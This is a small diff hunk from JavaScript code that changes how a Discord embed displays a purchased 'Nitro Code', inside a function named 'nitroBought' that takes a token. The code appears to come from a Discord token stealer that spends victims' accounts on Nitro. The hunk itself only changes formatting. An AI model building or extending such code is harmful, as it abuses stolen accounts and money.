@@ -873,7 +873,7 @@ const nitroBought = async (token) => {
         fields: [
           {
             name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ||**${code}**||\`\`\``,
+            value: `**Nitro Code:**\n\`\`\`diff\n+ ||${code}||\`\`\``,
             inline: true,
           },
           {
